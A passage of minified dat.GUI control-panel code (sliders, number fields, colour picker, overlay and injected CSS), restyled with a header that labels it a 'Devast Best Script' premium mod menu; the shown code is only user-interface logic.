                    l.__onFinishChange.call(l, l.getValue());
                }
            }
            function r(e) {
                var t = d - e.clientY;
                l.setValue(l.getValue() + t * l.__impliedStep);
                d = e.clientY;
            }
            function s() {
                X.unbind(window, "mousemove", r);
                X.unbind(window, "mouseup", s);
                i();
            }
            F(this, t);
            var a = V(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, n, o));
            a.__truncationSuspended = false;
            var l = a;
            var d = undefined;
            a.__input = document.createElement("input");
            a.__input.setAttribute("type", "text");
            X.bind(a.__input, "change", function() {
                var e = parseFloat(l.__input.value);
                if (!S.isNaN(e)) {
                    l.setValue(e);
                }
            });
            X.bind(a.__input, "blur", function() {
                i();
            });
            X.bind(a.__input, "mousedown", function(e) {
                X.bind(window, "mousemove", r);
                X.bind(window, "mouseup", s);
                d = e.clientY;
            });
            X.bind(a.__input, "keydown", function(e) {
                if (e.keyCode === 13) {
                    l.__truncationSuspended = true;
                    this.blur();
                    l.__truncationSuspended = false;
                    i();
                }
            });
            a.updateDisplay();
            a.domElement.appendChild(a.__input);
            return a;
        }
        j(t, W);
        P(t, [{
            key: "updateDisplay",
            value: function() {
                this.__input.value = this.__truncationSuspended ? this.getValue() : s(this.getValue(), this.__precision);
                return D(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "updateDisplay", this).call(this);
            }
        }]);
        return t;
    }();
    var q = function(e) {
        function t(e, n, o, i, r) {
            function s(e) {
                e.preventDefault();
                var t = _.__background.getBoundingClientRect();
                _.setValue(a(e.clientX, t.left, t.right, _.__min, _.__max));
                return false;
            }
            function l() {
                X.unbind(window, "mousemove", s);
                X.unbind(window, "mouseup", l);
                if (_.__onFinishChange) {
                    _.__onFinishChange.call(_, _.getValue());
                }
            }
            function d(e) {
                var t = e.touches[0].clientX;
                var n = _.__background.getBoundingClientRect();
                _.setValue(a(t, n.left, n.right, _.__min, _.__max));
            }
            function c() {
                X.unbind(window, "touchmove", d);
                X.unbind(window, "touchend", c);
                if (_.__onFinishChange) {
                    _.__onFinishChange.call(_, _.getValue());
                }
            }
            F(this, t);
            var u = V(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, n, {
                min: o,
                max: i,
                step: r
            }));
            var _ = u;
            u.__background = document.createElement("div");
            u.__foreground = document.createElement("div");
            X.bind(u.__background, "mousedown", function(e) {
                document.activeElement.blur();
                X.bind(window, "mousemove", s);
                X.bind(window, "mouseup", l);
                s(e);
            });
            X.bind(u.__background, "touchstart", function(e) {
                if (e.touches.length === 1) {
                    X.bind(window, "touchmove", d);
                    X.bind(window, "touchend", c);
                    d(e);
                }
            });
            X.addClass(u.__background, "slider");
            X.addClass(u.__foreground, "slider-fg");
            u.updateDisplay();
            u.__background.appendChild(u.__foreground);
            u.domElement.appendChild(u.__background);
            return u;
        }
        j(t, W);
        P(t, [{
            key: "updateDisplay",
            value: function() {
                var e = (this.getValue() - this.__min) / (this.__max - this.__min);
                this.__foreground.style.width = e * 100 + "%";
                return D(t.prototype.__proto__ || Object.getPrototypeOf(t.prototype), "updateDisplay", this).call(this);
            }
        }]);
        return t;
    }();
    var Z = function(e) {
        function t(e, n, o) {
            F(this, t);
            var i = V(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, n));
            var r = i;
            i.__button = document.createElement("div");
            i.__button.innerHTML = o === undefined ? "Fire" : o;
            X.bind(i.__button, "click", function(e) {
                e.preventDefault();
                r.fire();
                return false;
            });
            X.addClass(i.__button, "button");
            i.domElement.appendChild(i.__button);
            return i;
        }
        j(t, z);
        P(t, [{
            key: "fire",
            value: function() {
                if (this.__onChange) {
                    this.__onChange.call(this);
                }
                this.getValue().call(this.object);
                if (this.__onFinishChange) {
                    this.__onFinishChange.call(this, this.getValue());
                }
            }
        }]);
        return t;
    }();
    var $ = function(e) {
        function t(e, n) {
            function o(e) {
                u(e);
                X.bind(window, "mousemove", u);
                X.bind(window, "touchmove", u);
                X.bind(window, "mouseup", r);
                X.bind(window, "touchend", r);
            }
            function i(e) {
                _(e);
                X.bind(window, "mousemove", _);
                X.bind(window, "touchmove", _);
                X.bind(window, "mouseup", s);
                X.bind(window, "touchend", s);
            }
            function r() {
                X.unbind(window, "mousemove", u);
                X.unbind(window, "touchmove", u);
                X.unbind(window, "mouseup", r);
                X.unbind(window, "touchend", r);
                c();
            }
            function s() {
                X.unbind(window, "mousemove", _);
                X.unbind(window, "touchmove", _);
                X.unbind(window, "mouseup", s);
                X.unbind(window, "touchend", s);
                c();
            }
            function a() {
                var e = R(this.value);
                if (e !== false) {
                    p.__color.__state = e;
                    p.setValue(p.__color.toOriginal());
                } else {
                    this.value = p.__color.toString();
                }
            }
            function c() {
                if (p.__onFinishChange) {
                    p.__onFinishChange.call(p, p.__color.toOriginal());
                }
            }
            function u(e) {
                if (e.type.indexOf("touch") === -1) {
                    e.preventDefault();
                }
                var t = p.__saturation_field.getBoundingClientRect();
                var n = e.touches && e.touches[0] || e;
                var o = n.clientX;
                var i = n.clientY;
                var r = (o - t.left) / (t.right - t.left);
                var s = 1 - (i - t.top) / (t.bottom - t.top);
                if (s > 1) {
                    s = 1;
                } else if (s < 0) {
                    s = 0;
                }
                if (r > 1) {
                    r = 1;
                } else if (r < 0) {
                    r = 0;
                }
                p.__color.v = s;
                p.__color.s = r;
                p.setValue(p.__color.toOriginal());
                return false;
            }
            function _(e) {
                if (e.type.indexOf("touch") === -1) {
                    e.preventDefault();
                }
                var t = p.__hue_field.getBoundingClientRect();
                var n = 1 - ((e.touches && e.touches[0] || e).clientY - t.top) / (t.bottom - t.top);
                if (n > 1) {
                    n = 1;
                } else if (n < 0) {
                    n = 0;
                }
                p.__color.h = n * 360;
                p.setValue(p.__color.toOriginal());
                return false;
            }
            F(this, t);
            var h = V(this, (t.__proto__ || Object.getPrototypeOf(t)).call(this, e, n));
            h.__color = new I(h.getValue());
            h.__temp = new I(0);
            var p = h;
            h.domElement = document.createElement("div");
            X.makeSelectable(h.domElement, false);
            h.__selector = document.createElement("div");
            h.__selector.className = "selector";
            h.__saturation_field = document.createElement("div");
            h.__saturation_field.className = "saturation-field";
            h.__field_knob = document.createElement("div");
            h.__field_knob.className = "field-knob";
            h.__field_knob_border = "2px solid ";
            h.__hue_knob = document.createElement("div");
            h.__hue_knob.className = "hue-knob";
            h.__hue_field = document.createElement("div");
            h.__hue_field.className = "hue-field";
            h.__input = document.createElement("input");
            h.__input.type = "text";
            h.__input_textShadow = "0 1px 1px ";
            X.bind(h.__input, "keydown", function(e) {
                if (e.keyCode === 13) {
                    a.call(this);
                }
            });
            X.bind(h.__input, "blur", a);
            X.bind(h.__selector, "mousedown", function() {
                X.addClass(this, "drag").bind(window, "mouseup", function() {
                    X.removeClass(p.__selector, "drag");
                });
            });
            X.bind(h.__selector, "touchstart", function() {
                X.addClass(this, "drag").bind(window, "touchend", function() {
                    X.removeClass(p.__selector, "drag");
                });
            });
            var f = document.createElement("div");
            S.extend(h.__selector.style, {
                width: "122px",
                height: "102px",
                padding: "3px",
                backgroundColor: "#222",
                boxShadow: "0px 1px 3px rgba(0,0,0,0.3)"
            });
            S.extend(h.__field_knob.style, {
                position: "absolute",
                width: "12px",
                height: "12px",
                border: h.__field_knob_border + (h.__color.v < 0.5 ? "#fff" : "#000"),
                boxShadow: "0px 1px 3px rgba(0,0,0,0.5)",
                borderRadius: "12px",
                zIndex: 1
            });
            S.extend(h.__hue_knob.style, {
                position: "absolute",
                width: "15px",
                height: "2px",
                borderRight: "4px solid #fff",
                zIndex: 1
            });
            S.extend(h.__saturation_field.style, {
                width: "100px",
                height: "100px",
                border: "1px solid #555",
                marginRight: "3px",
                display: "inline-block",
                cursor: "pointer"
            });
            S.extend(f.style, {
                width: "100%",
                height: "100%",
                background: "none"
            });
            l(f, "top", "rgba(0,0,0,0)", "#000");
            S.extend(h.__hue_field.style, {
                width: "15px",
                height: "100px",
                border: "1px solid #555",
                cursor: "ns-resize",
                position: "absolute",
                top: "3px",
                right: "3px"
            });
            d(h.__hue_field);
            S.extend(h.__input.style, {
                outline: "none",
                textAlign: "center",
                color: "#fff",
                border: 0,
                fontWeight: "bold",
                textShadow: h.__input_textShadow + "rgba(0,0,0,0.7)"
            });
            X.bind(h.__saturation_field, "mousedown", o);
            X.bind(h.__saturation_field, "touchstart", o);
            X.bind(h.__field_knob, "mousedown", o);
            X.bind(h.__field_knob, "touchstart", o);
            X.bind(h.__hue_field, "mousedown", i);
            X.bind(h.__hue_field, "touchstart", i);
            h.__saturation_field.appendChild(f);
            h.__selector.appendChild(h.__field_knob);
            h.__selector.appendChild(h.__saturation_field);
            h.__selector.appendChild(h.__hue_field);
            h.__hue_field.appendChild(h.__hue_knob);
            h.domElement.appendChild(h.__input);
            h.domElement.appendChild(h.__selector);
            h.updateDisplay();
            return h;
        }
        j(t, z);
        P(t, [{
            key: "updateDisplay",
            value: function() {
                var e = R(this.getValue());
                if (e !== false) {
                    var t = false;
                    S.each(I.COMPONENTS, function(n) {
                        if (!S.isUndefined(e[n]) && !S.isUndefined(this.__color.__state[n]) && e[n] !== this.__color.__state[n]) {
                            t = true;
                            return {};
                        }
                    }, this);
                    if (t) {
                        S.extend(this.__color.__state, e);
                    }
                }
                S.extend(this.__temp.__state, this.__color.__state);
                this.__temp.a = 1;
                var n = this.__color.v < 0.5 || this.__color.s > 0.5 ? 255 : 0;
                var o = 255 - n;
                S.extend(this.__field_knob.style, {
                    marginLeft: this.__color.s * 100 - 7 + "px",
                    marginTop: (1 - this.__color.v) * 100 - 7 + "px",
                    backgroundColor: this.__temp.toHexString(),
                    border: this.__field_knob_border + "rgb(" + n + "," + n + "," + n + ")"
                });
                this.__hue_knob.style.marginTop = (1 - this.__color.h / 360) * 100 + "px";
                this.__temp.s = 1;
                this.__temp.v = 1;
                l(this.__saturation_field, "left", "#fff", this.__temp.toHexString());
                this.__input.value = this.__color.toString();
                S.extend(this.__input.style, {
                    backgroundColor: this.__color.toHexString(),
                    color: "rgb(" + n + "," + n + "," + n + ")",
                    textShadow: this.__input_textShadow + "rgba(" + o + "," + o + "," + o + ",.7)"
                });
            }
        }]);
        return t;
    }();
    var ee = ["-moz-", "-o-", "-webkit-", "-ms-", ""];
    var te = {
        load: function(e, t) {
            var n = t || document;
            var o = n.createElement("link");
            o.type = "text/css";
            o.rel = "stylesheet";
            o.href = e;
            n.getElementsByTagName("head")[0].appendChild(o);
        },
        inject: function(e, t) {
            var n = t || document;
            var o = document.createElement("style");
            o.type = "text/css";
            o.innerHTML = e;
            var i = n.getElementsByTagName("head")[0];
            try {
                i.appendChild(o);
            } catch (e) {}
        }
    };
    function ne(e, t) {
        var n = e[t];
        if (S.isArray(arguments[2]) || S.isObject(arguments[2])) {
            return new Y(e,t,arguments[2]);
        } else if (S.isNumber(n)) {
            if (S.isNumber(arguments[2]) && S.isNumber(arguments[3])) {
                if (S.isNumber(arguments[4])) {
                    return new q(e,t,arguments[2],arguments[3],arguments[4]);
                } else {
                    return new q(e,t,arguments[2],arguments[3]);
                }
            } else if (S.isNumber(arguments[4])) {
                return new Q(e,t,{
                    min: arguments[2],
                    max: arguments[3],
                    step: arguments[4]
                });
            } else {
                return new Q(e,t,{
                    min: arguments[2],
                    max: arguments[3]
                });
            }
        } else if (S.isString(n)) {
            return new J(e,t);
        } else if (S.isFunction(n)) {
            return new Z(e,t,"");
        } else if (S.isBoolean(n)) {
            return new K(e,t);
        } else {
            return null;
        }
    }
    var oe = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame || function(e) {
        setTimeout(e, 1000 / 60);
    }
    ;
    var ie = function() {
        function e() {
            F(this, e);
            this.backgroundElement = document.createElement("div");
            S.extend(this.backgroundElement.style, {
                backgroundColor: "rgba(0,0,0,0.8)",
                top: 0,
                left: 0,
                display: "none",
                zIndex: "1000",
                opacity: 0,
                WebkitTransition: "opacity 0.2s linear",
                transition: "opacity 0.2s linear"
            });
            X.makeFullscreen(this.backgroundElement);
            this.backgroundElement.style.position = "fixed";
            this.domElement = document.createElement("div");
            S.extend(this.domElement.style, {
                position: "fixed",
                display: "none",
                zIndex: "1001",
                opacity: 0,
                WebkitTransition: "-webkit-transform 0.2s ease-out, opacity 0.2s linear",
                transition: "transform 0.2s ease-out, opacity 0.2s linear"
            });
            document.body.appendChild(this.backgroundElement);
            document.body.appendChild(this.domElement);
            var t = this;
            X.bind(this.backgroundElement, "click", function() {
                t.hide();
            });
        }
        P(e, [{
            key: "show",
            value: function() {
                var e = this;
                this.backgroundElement.style.display = "block";
                this.domElement.style.display = "block";
                this.domElement.style.opacity = 0;
                this.domElement.style.webkitTransform = "scale(1.1)";
                this.layout();
                S.defer(function() {
                    e.backgroundElement.style.opacity = 1;
                    e.domElement.style.opacity = 1;
                    e.domElement.style.webkitTransform = "scale(1)";
                });
            }
        }, {
            key: "hide",
            value: function() {
                var e = this;
                var t = function t() {
                    e.domElement.style.display = "none";
                    e.backgroundElement.style.display = "none";
                    X.unbind(e.domElement, "webkitTransitionEnd", t);
                    X.unbind(e.domElement, "transitionend", t);
                    X.unbind(e.domElement, "oTransitionEnd", t);
                };
                X.bind(this.domElement, "webkitTransitionEnd", t);
                X.bind(this.domElement, "transitionend", t);
                X.bind(this.domElement, "oTransitionEnd", t);
                this.backgroundElement.style.opacity = 0;
                this.domElement.style.opacity = 0;
                this.domElement.style.webkitTransform = "scale(1.1)";
            }
        }, {
            key: "layout",
            value: function() {
                this.domElement.style.left = window.innerWidth / 2 - X.getWidth(this.domElement) / 2 + "px";
                this.domElement.style.top = window.innerHeight / 2 - X.getHeight(this.domElement) / 2 + "px";
            }
        }]);
        return e;
    }();
    var re = function(e) {
        if (e && typeof window != "undefined") {
            var t = document.createElement("style");
            t.setAttribute("type", "text/css");
            t.innerHTML = e;
            document.head.appendChild(t);
            return e;
        }
    }(".dg ul{list-style:none;margin:0;padding:0;width:100%;clear:both}.dg.ac{position:fixed;top:0;left:0;right:0;height:0;z-index:99999}.dg:not(.ac) .main{overflow:hidden}.dg.main{-webkit-transition:opacity .2s ease;-o-transition:opacity .2s ease;-moz-transition:opacity .2s ease;transition:opacity .2s ease;position:fixed;top:0;right:0;background:linear-gradient(180deg,rgba(16,14,10,.98) 0%,rgba(20,18,14,.97) 100%);width:320px;max-height:92vh;overflow-y:auto;padding:0;border-radius:0 0 0 12px;color:#c4b898;font-family:'Segoe UI',Arial,sans-serif;font-size:12px;box-shadow:0 4px 30px rgba(0,0,0,.8),0 0 1px rgba(200,168,50,.15),inset 0 1px 0 rgba(160,140,50,.06);z-index:99999;border:1px solid rgba(120,100,40,.15);border-top:none;border-right:none;scrollbar-width:thin;scrollbar-color:rgba(140,120,50,.2) transparent}.dg.main.taller-than-window{overflow-y:auto}.dg.main.taller-than-window .close-button{opacity:1;margin-top:-1px;border-top:1px solid rgba(100,85,35,.15)}.dg.main ul.closed .close-button{opacity:1 !important}.dg.main:hover .close-button,.dg.main .close-button.drag{opacity:1}.dg.main .close-button{-webkit-transition:all .15s ease;transition:all .15s ease;border:0;line-height:18px;height:18px;cursor:pointer;text-align:center;background-color:rgba(18,17,15,.95);color:#a09060}.dg.main .close-button{display:none}.dg.main .close-button.close-top{display:none}.dg.main .close-button.close-bottom{display:none}.dg.main .close-button:hover{background-color:rgba(30,28,20,.95);color:#c8a832}.dg.main::-webkit-scrollbar{width:5px}.dg.main::-webkit-scrollbar-track{background:transparent}.dg.main::-webkit-scrollbar-thumb{border-radius:5px;background:rgba(140,120,50,.2)}.dg.main::-webkit-scrollbar-thumb:hover{background:rgba(160,140,50,.35)}.dg.a{float:right;margin-right:0;overflow-y:visible}.dg.a.has-save>ul.close-top{margin-top:0}.dg.a.has-save>ul.close-bottom{margin-top:27px}.dg.a.has-save>ul.closed{margin-top:0}.dg.a .save-row{top:0;z-index:1002}.dg.a .save-row.close-top{position:relative}.dg.a .save-row.close-bottom{position:fixed}.dg li{-webkit-transition:height .12s ease-out;transition:height .12s ease-out}.dg li:not(.folder){cursor:auto;height:28px;line-height:28px;padding:0 8px 0 8px;background:rgba(22,21,18,.88);border-bottom:1px solid rgba(80,70,35,.08)}.dg li.folder{padding:0;border-left:none;border-bottom:0}.dg li.title{cursor:pointer;margin-left:0;padding:0 0 0 14px;height:30px;line-height:30px;background-color:rgba(25,23,18,.95);background-image:url(data:image/gif;base64,R0lGODlhBQAFAJEAAP////Pz8////////yH5BAEAAAIALAAAAAAFAAUAAAIIlI+hKgFxoCgAOw==);background-repeat:no-repeat;background-position:6px 12px;color:#c8a832;font-weight:600;font-size:11.5px;letter-spacing:.4px;border-bottom:1px solid rgba(100,85,35,.12);border-left:3px solid rgba(180,150,40,.35);transition:all .18s ease}.dg li.title:hover{background-color:rgba(35,32,24,.98);color:#e8c840;border-left-color:rgba(200,168,50,.7);padding-left:18px}.dg .folder .folder li.title{color:#d4b84a}.dg .folder .folder li.title:hover{color:#f0d050}.dg .closed li:not(.title),.dg .closed ul li,.dg .closed ul li>*{height:0;overflow:hidden;border:0}.dg .closed li.title{background-image:url(data:image/gif;base64,R0lGODlhBQAFAJEAAP////Pz8////////yH5BAEAAAIALAAAAAAFAAUAAAIIlGIWqMCbWAEAOw==)}.dg .cr{clear:both;padding-left:8px;height:28px;line-height:28px;overflow:hidden;background-color:rgba(22,21,18,.82);color:#a89c70;border-bottom:1px solid rgba(80,70,35,.06);transition:background .15s ease,padding .15s ease}.dg .cr:hover{background-color:rgba(32,30,22,.88);padding-left:10px}.dg .property-name{cursor:default;float:left;clear:left;width:40%;overflow:hidden;text-overflow:ellipsis;color:#9a8e68;font-size:11px;transition:color .15s}.dg .cr:hover .property-name{color:#c8b870}.dg .cr.function .property-name{width:100%;color:#b8a050;font-weight:600}.dg .cr.function:hover .property-name{color:#e0c040}.dg .c{float:left;width:60%;position:relative}.dg .c input[type=text]{background:rgba(24,22,16,.95);color:#b8ac85;border:1px solid rgba(100,85,35,.18);border-radius:3px;outline:none;margin-top:4px;padding:2px 5px;width:100%;float:right;caret-color:#c8a832;transition:all .15s ease}.dg .c input[type=text]:hover{background:rgba(30,28,18,.95);border-color:rgba(120,100,40,.3)}.dg .c input[type=text]:focus{background:rgba(28,26,18,1);color:#e0d090;border-color:rgba(180,150,50,.45);outline:none;box-shadow:0 0 0 1px rgba(200,168,50,.1)}.dg .c input[type=text]::selection{background:rgba(140,120,40,.3);color:#e0d5b0}.dg .has-slider input[type=text]{width:30%;margin-left:0}.dg .slider{float:left;width:66%;margin-left:-5px;margin-right:0;height:18px;margin-top:5px;background:rgba(28,26,18,.5);border-radius:3px;cursor:ew-resize;transition:background .15s}.dg .slider-fg{height:100%;background:linear-gradient(90deg,#7a6820,#b89830);max-width:100%;border-radius:3px;transition:background .15s;box-shadow:0 0 4px rgba(200,168,50,.15)}.dg .slider:hover{background:rgba(35,32,22,.6)}.dg .slider:hover .slider-fg{background:linear-gradient(90deg,#a89035,#d4b040);box-shadow:0 0 8px rgba(200,168,50,.25)}.dg .c input[type=checkbox]{margin-top:6px;accent-color:#a08a35;width:16px;height:16px;cursor:pointer;outline:1px solid rgba(140,120,50,.3);border-radius:3px;-webkit-appearance:checkbox;appearance:checkbox}.dg .c select{background-color:rgba(24,22,16,.95);color:#b8ac85;border:1px solid rgba(100,85,35,.18);border-radius:3px;margin-top:5px;padding:1px 3px}.dg .cr.boolean{border-left:3px solid rgba(120,105,50,.4)}.dg .cr.color{border-left:3px solid;overflow:visible}.dg .cr.function{border-left:3px solid rgba(170,140,45,.4)}.dg .cr.number{border-left:3px solid rgba(180,150,40,.4)}.dg .cr.number input[type=text]{color:#c8a832}.dg .cr.string{border-left:3px solid rgba(70,100,130,.4)}.dg .cr.string input[type=text]{color:#a89878}.dg .cr.function,.dg .cr.function .property-name,.dg .cr.function *,.dg .cr.boolean,.dg .cr.boolean *{cursor:pointer}.dg .cr.function:hover,.dg .cr.boolean:hover{background:rgba(32,30,22,.88)}.dg .selector{display:none;position:absolute;margin-left:-9px;margin-top:23px;z-index:10;background:rgba(18,16,12,.98);border:1px solid rgba(120,100,40,.25);border-radius:4px;padding:2px;box-shadow:0 4px 12px rgba(0,0,0,.5)}.dg .c:hover .selector,.dg .selector.drag{display:block}.dg li.save-row{padding:0;line-height:23px;background:rgba(28,26,18,.9)}.dg li.save-row .button{display:inline-block;padding:0px 6px;margin-left:5px;margin-top:1px;border-radius:3px;font-size:9px;line-height:7px;padding:4px 6px 5px 6px;background:rgba(120,100,40,.25);color:#b0a478;text-shadow:none;cursor:pointer;transition:all .15s}.dg li.save-row .button.gears{background:rgba(120,100,40,.25) url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAsAAAANCAYAAAB/9ZQ7AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAQJJREFUeNpiYKAU/P//PwGIC/ApCABiBSAW+I8AClAcgKxQ4T9hoMAEUrxx2QSGN6+egDX+/vWT4e7N82AMYoPAx/evwWoYoSYbACX2s7KxCxzcsezDh3evFoDEBYTEEqycggWAzA9AuUSQQgeYPa9fPv6/YWm/Acx5IPb7ty/fw+QZblw67vDs8R0YHyQhgObx+yAJkBqmG5dPPDh1aPOGR/eugW0G4vlIoTIfyFcA+QekhhHJhPdQxbiAIguMBTQZrPD7108M6roWYDFQiIAAv6Aow/1bFwXgis+f2LUAynwoIaNcz8XNx3Dl7MEJUDGQpx9gtQ8YCueB+D26OECAAQDadt7e46D42QAAAABJRU5ErkJggg==) 2px 1px no-repeat;height:7px;width:8px}.dg li.save-row .button:hover{background-color:rgba(150,125,40,.35);color:#d0c090}.dg li.save-row select{margin-left:5px;width:108px}.dg li.folder{border-bottom:0}.dg li.menu-header{height:auto;text-align:center;background:linear-gradient(180deg,rgba(22,20,14,.98) 0%,rgba(18,16,12,.95) 100%);border-bottom:1px solid rgba(120,100,40,.15);cursor:pointer;padding:0;margin:0;overflow:hidden;transition:all .25s ease;user-select:none;position:relative}.dg li.menu-header .hdr-deco{position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,transparent,rgba(200,168,50,.3) 20%,rgba(200,168,50,.5) 50%,rgba(200,168,50,.3) 80%,transparent)}.dg li.menu-header .hdr-icon{display:inline-block;vertical-align:middle;width:22px;height:22px;margin-right:6px;opacity:.7;transition:all .25s}.dg li.menu-header .hdr-title{display:block;padding:12px 10px 2px;font-size:15px;font-weight:800;letter-spacing:2.5px;text-transform:uppercase;background:linear-gradient(90deg,#8a7525,#c8a832 30%,#f5e27a 50%,#c8a832 70%,#8a7525);background-size:200% 100%;-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;animation:dbs-menu-shimmer 3s linear infinite;line-height:1.2}.dg li.menu-header .hdr-sub{display:block;padding:0 10px 10px;font-size:9px;letter-spacing:4px;color:rgba(200,168,50,.25);text-transform:uppercase;line-height:1}@keyframes dbs-menu-shimmer{0%{background-position:100% 0}100%{background-position:-100% 0}}.dg li.menu-header:hover{background:linear-gradient(180deg,rgba(28,25,18,.98) 0%,rgba(24,22,16,.95) 100%)}.dg li.menu-header:hover .hdr-title{filter:brightness(1.2)}.dg li.menu-header:hover .hdr-icon{opacity:1;transform:rotate(15deg)}.dg li.menu-header:hover .hdr-deco{background:linear-gradient(90deg,transparent,rgba(200,168,50,.5) 20%,rgba(200,168,50,.8) 50%,rgba(200,168,50,.5) 80%,transparent)}.dg li.menu-header.glow .hdr-title{filter:brightness(1.5)}.dg li.menu-header.glow .hdr-deco{background:linear-gradient(90deg,transparent,rgba(255,215,0,.6) 20%,rgba(255,215,0,1) 50%,rgba(255,215,0,.6) 80%,transparent);box-shadow:0 0 10px rgba(255,215,0,.3)}.dg li.menu-header .hdr-sep{display:block;height:1px;margin:0 15px;background:linear-gradient(90deg,transparent,rgba(200,168,50,.12),transparent)}.dg.dialogue{background-color:#1a1810;width:460px;padding:15px;font-size:13px;line-height:15px}#dg-new-constructor{padding:10px;color:#d0c090;font-family:Monaco,monospace;font-size:10px;border:1px solid rgba(100,85,35,.2);resize:none;box-shadow:inset 1px 1px 1px rgba(0,0,0,.5);word-wrap:break-word;margin:12px 0;display:block;width:440px;overflow-y:scroll;height:100px;position:relative;background:rgba(15,13,8,.9)}#dg-local-explain{display:none;font-size:11px;line-height:17px;border-radius:3px;background-color:rgba(30,28,18,.9);padding:8px;margin-top:10px;color:#c8b880}#dg-local-explain code{font-size:10px}#dat-gui-save-locally{display:none}.dg{color:#b0a880;text-shadow:none;font:11.5px 'Segoe UI','Lucida Grande',sans-serif;-webkit-user-select:none;-moz-user-select:none;user-select:none}.dg .c input[type=text],.dg .c select{-webkit-user-select:text;-moz-user-select:text;user-select:text}\n");
    te.inject(re);
    (function() {
        var s = document.createElement("style");
        s.setAttribute("type", "text/css");
        s.innerHTML = ".dg .cr.has-slider .c{display:flex!important;align-items:center;float:none!important;gap:0}.dg .cr.has-slider .c>div:first-child{flex:0 0 auto;width:auto;min-width:0}.dg .cr.has-slider .c>div:first-child input[type=text]{width:50px!important;float:none!important;margin:0!important;padding:2px 4px;text-align:right;box-sizing:border-box}.dg .cr.has-slider .slider{float:none!important;flex:1 1 0%;width:auto!important;min-width:0;margin-left:4px!important;margin-right:0!important;margin-top:0!important;height:16px;display:block!important;position:relative;overflow:hidden}.dg .cr.has-slider .slider-fg{height:100%!important;display:block!important;position:absolute;top:0;left:0;min-width:0}";
        document.head.appendChild(s);
    }
    )();
    var se = "Default";
    var ae = function() {
        try {
            return !!window.localStorage;
        } catch (e) {
            return false;
        }
    }();
    var le = undefined;
    var de = true;
    var ce = undefined;
    var ue = false;
    var _e = [];
    var he = function e(t) {
        var n = this;
        var o = t || {};
        this.domElement = document.createElement("div");
        this.__ul = document.createElement("ul");
        this.domElement.appendChild(this.__ul);
        X.addClass(this.domElement, "dg");
        this.__folders = {};
        this.__controllers = [];
        this.__rememberedObjects = [];
        this.__rememberedObjectIndecesToControllers = [];
        this.__listening = [];
        o = S.defaults(o, {
            closeOnTop: false,
            autoPlace: true,
            width: e.DEFAULT_WIDTH
        });
        o = S.defaults(o, {
            resizable: o.autoPlace,
            hideable: o.autoPlace
        });
        if (S.isUndefined(o.load)) {
            o.load = {
                preset: se
            };
        } else if (o.preset) {
            o.load.preset = o.preset;
        }
        if (S.isUndefined(o.parent) && o.hideable) {
            _e.push(this);
        }
        o.resizable = false;
        if (o.autoPlace && S.isUndefined(o.scrollable)) {
            o.scrollable = true;
        }
        var i = ae && localStorage.getItem(m(this, "isLocal")) === "true";
        var r = undefined;
        var s = undefined;
        Object.defineProperties(this, {
            parent: {
                get: function() {
                    return o.parent;
                }
            },
            scrollable: {
                get: function() {
                    return o.scrollable;
                }
            },
            autoPlace: {
                get: function() {
                    return o.autoPlace;
                }
            },
            closeOnTop: {
                get: function() {
                    return o.closeOnTop;
                }
            },
            preset: {
                get: function() {
                    if (n.parent) {
                        return n.getRoot().preset;
                    } else {
                        return o.load.preset;
                    }
                },
                set: function(e) {
                    if (n.parent) {
                        n.getRoot().preset = e;
                    } else {
                        o.load.preset = e;
                    }
                    E(this);
                    n.revert();
                }
            },
            width: {
                get: function() {
                    return o.width;
                },
                set: function(e) {
                    o.width = e;
                    w(n, e);
                }
            },
            name: {
                get: function() {
                    return o.name;
                },
                set: function(e) {
                    o.name = e;
                    if (s) {
                        s.innerHTML = o.name;
                    }
                }
            },
            closed: {
                get: function() {
                    return o.closed;
                },
                set: function(t) {
                    o.closed = t;
                    if (o.closed) {
                        X.addClass(n.__ul, e.CLASS_CLOSED);
                    } else {
                        X.removeClass(n.__ul, e.CLASS_CLOSED);
                    }
                    this.onResize();
                    if (n.__closeButton) {
                        n.__closeButton.innerHTML = t ? e.TEXT_OPEN : e.TEXT_CLOSED;
                    }
                }
            },
            load: {
                get: function() {
                    return o.load;
                }
            },
            useLocalStorage: {
                get: function() {
                    return i;
                },
                set: function(e) {
                    if (ae) {
                        i = e;
                        if (e) {
                            X.bind(window, "unload", r);
                        } else {
                            X.unbind(window, "unload", r);
                        }
                        localStorage.setItem(m(n, "isLocal"), e);
                    }
                }
            }
        });
        if (S.isUndefined(o.parent)) {
            this.closed = o.closed || false;
            X.addClass(this.domElement, e.CLASS_MAIN);
            X.makeSelectable(this.domElement, false);
            var _hdr = document.createElement("li");
            _hdr.className = "menu-header";
            _hdr.innerHTML = '<div class="hdr-deco"></div><span class="hdr-title"><svg class="hdr-icon" viewBox="0 0 50 50" fill="none" xmlns="http://www.w3.org/2000/svg" style="width:18px;height:18px;vertical-align:middle;margin-right:5px;margin-top:-2px"><path d="M25 2L46 14v22L25 48 4 36V14L25 2z" stroke="rgba(200,168,50,.7)" stroke-width="1.5"/><path d="M25 14L34 19v10L25 34 16 29V19L25 14z" fill="rgba(200,168,50,.2)" stroke="rgba(200,168,50,.6)" stroke-width="1"/><circle cx="25" cy="25" r="3" fill="#c8a832"/></svg>Devast Best Script</span><span class="hdr-sub">premium mod menu</span>';
            _hdr.onclick = function() {
                _hdr.classList.add("glow");
                setTimeout(function() {
                    _hdr.classList.remove("glow");
                }, 800);
            }
            ;
            this.__ul.appendChild(_hdr);
            if (ae && i) {
                n.useLocalStorage = true;
                var a = localStorage.getItem(m(this, "gui"));
                if (a) {
                    o.load = JSON.parse(a);
                }
            }
            this.__closeButton = document.createElement("div");
            this.__closeButton.innerHTML = e.TEXT_CLOSED;
            X.addClass(this.__closeButton, e.CLASS_CLOSE_BUTTON);
            if (o.closeOnTop) {
                X.addClass(this.__closeButton, e.CLASS_CLOSE_TOP);
                this.domElement.insertBefore(this.__closeButton, this.domElement.childNodes[0]);
            } else {
                X.addClass(this.__closeButton, e.CLASS_CLOSE_BOTTOM);
